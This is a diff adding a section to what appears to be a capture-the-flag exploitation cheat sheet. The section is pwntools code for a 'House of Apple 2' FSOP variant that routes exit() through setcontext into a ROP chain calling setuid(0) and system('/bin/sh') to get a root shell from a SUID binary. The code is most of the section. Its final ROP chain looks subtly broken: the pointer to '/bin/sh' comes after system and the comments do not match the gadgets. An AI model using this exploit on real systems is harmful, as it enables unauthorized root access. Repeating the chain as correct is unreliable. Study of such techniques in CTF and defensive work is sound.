@@ -8,6 +8,7 @@
   - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
 - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
 - [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
+  - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
 - [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
 - [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
 - [Heap Exploitation](#heap-exploitation)
@@ -139,6 +140,42 @@ fake_wide_vtable = flat({
 # When writing to freed chunk, mangle the target address:
 mangled_fd = target_addr ^ (current_chunk_addr >> 12)
 ```
+
+### setcontext Variant for SUID Binaries (Midnight Flag 2026)
+
+When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:
+
+```python
+# Wide vtable targets setcontext instead of system
+fake_wide_vtable = flat({
+    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
+})
+
+# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
+#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
+# Place ROP chain at _wide_data structure:
+fake_wide_data = flat({
+    0x18: p64(0),                     # _IO_write_base = 0
+    0x30: p64(0),                     # _IO_buf_base = 0
+    0x68: p64(0),                     # RDI = 0 (for setuid(0))
+    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
+    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
+    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
+})
+
+# ROP chain at rop_chain_addr:
+rop = flat([
+    pop_rdi_ret,
+    libc.address + 0,               # After setuid(0) returns here
+    # ... additional setup ...
+    libc.sym.system,
+    next(libc.search(b"/bin/sh\x00")),
+])
+```
+
+**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.
+
+**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.
 
 ---
 
